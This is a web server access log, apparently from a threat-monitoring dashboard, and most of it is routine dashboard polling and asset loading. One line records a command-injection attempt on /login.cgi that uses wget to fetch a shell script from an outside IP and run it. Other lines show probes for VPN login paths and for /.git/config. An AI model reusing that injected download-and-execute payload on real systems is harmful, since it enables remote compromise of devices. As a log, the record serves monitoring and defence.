193.189.185.113 - - [12/Mar/2025:09:51:53 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2738 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
37.139.5.66 - - [12/Mar/2025:09:52:01 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://193.35.18.164/klausschwab.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 29 "-" "linus-torvalds-loves-you"
138.197.220.227 - - [12/Mar/2025:09:52:37 +0000] "GET / HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
138.197.220.227 - - [12/Mar/2025:09:52:37 +0000] "GET /auth.html HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
138.197.220.227 - - [12/Mar/2025:09:52:37 +0000] "GET /auth1.html HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
138.197.220.227 - - [12/Mar/2025:09:52:37 +0000] "GET /sslvpnLogin.html HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
138.197.220.227 - - [12/Mar/2025:09:52:37 +0000] "GET /api/sonicos/auth HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
138.197.220.227 - - [12/Mar/2025:09:52:37 +0000] "GET /api/sonicos/tfa HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:09:52:53 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2738 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:53:53 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2738 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:54:09 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 107625 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:54:53 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2738 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:55:53 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2738 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:56:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2730 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:57:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2730 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:58:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2730 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:59:17 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 115911 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:09:59:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:00:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:01:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:02:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:03:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:04:26 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 117022 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:04:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:05:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:06:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:07:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2729 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:08:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3102 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:09:34 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 118774 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:09:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3102 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:10:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3102 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:11:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:12:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:13:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:14:42 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 120136 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:14:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:15:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:16:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:17:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
94.102.49.155 - - [12/Mar/2025:10:17:56 +0000] "GET / HTTP/1.1" 404 48 "-" "Python/3.10 aiohttp/3.8.4"
80.82.77.202 - - [12/Mar/2025:10:18:19 +0000] "GET / HTTP/1.1" 404 48 "-" "Python/3.10 aiohttp/3.8.4"
193.189.185.113 - - [12/Mar/2025:10:18:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:19:50 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 122109 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:19:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3101 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:20:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2623 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:21:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2623 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:22:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2623 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:23:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:24:56 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:24:59 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 118556 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
172.71.99.8 - - [12/Mar/2025:10:25:14 +0000] "GET /.git/config HTTP/1.1" 200 1018 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16"
193.189.185.113 - - [12/Mar/2025:10:25:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
179.43.175.250 - - [12/Mar/2025:10:26:35 +0000] "GET / HTTP/1.1" 404 48 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.189.185.113 - - [12/Mar/2025:10:26:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:27:44 +0000] "GET / HTTP/1.1" 200 1018 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:44 +0000] "GET /css/app.96271e32.css HTTP/1.1" 200 24966 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:44 +0000] "GET /js/app.4c07236b.js HTTP/1.1" 200 87699 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:45 +0000] "GET /css/chunk-vendors.77e64f29.css HTTP/1.1" 200 748892 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:49 +0000] "GET /js/chunk-vendors.f0d1e719.js HTTP/1.1" 200 2111031 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:50 +0000] "GET /img/shield-full.1ea8ff61.png HTTP/1.1" 200 7248 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:50 +0000] "GET /img/lower-arrow.7a64c699.png HTTP/1.1" 200 16025 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:50 +0000] "GET /img/upper-arrow.860ee4d0.png HTTP/1.1" 200 20167 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:50 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 118556 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:50 +0000] "GET /api-web/v1/counter_data HTTP/1.1" 200 125 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:51 +0000] "GET /img/night-sky.1701d635.png HTTP/1.1" 200 904154 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:52 +0000] "GET /img/earth-night-resized.3dce4089.jpg HTTP/1.1" 200 3661689 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:52 +0000] "GET /favicons/favicon.ico HTTP/1.1" 200 15086 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:52 +0000] "GET /favicons/site.webmanifest HTTP/1.1" 200 452 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:54 +0000] "GET /fonts/fa-solid-900.8e1ed89b.woff2 HTTP/1.1" 200 80300 "https://cyber.ltfe.org/css/chunk-vendors.77e64f29.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:54 +0000] "GET /api-web/v1/counter_data HTTP/1.1" 200 125 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:54 +0000] "GET /img/cyber-logo.c24a1e46.svg HTTP/1.1" 200 24197 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:27:54 +0000] "GET /fonts/fa-brands-400.f075c50f.woff2 HTTP/1.1" 200 78460 "https://cyber.ltfe.org/css/chunk-vendors.77e64f29.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:27:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:28:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:28:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:29:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:29:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:30:07 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 115294 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:30:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:30:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:31:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:31:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
35.240.7.120 - - [12/Mar/2025:10:32:03 +0000] "GET / HTTP/1.1" 404 48 "-" "python-requests/2.32.3"
82.198.201.114 - - [12/Mar/2025:10:32:50 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 115294 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:10:32:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2622 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:32:57 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2584 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:33:54 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2584 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:33:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2584 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:34:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2584 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:10:34:58 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2584 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:10:35:14 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 117211 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:10:35:55 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 2584 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
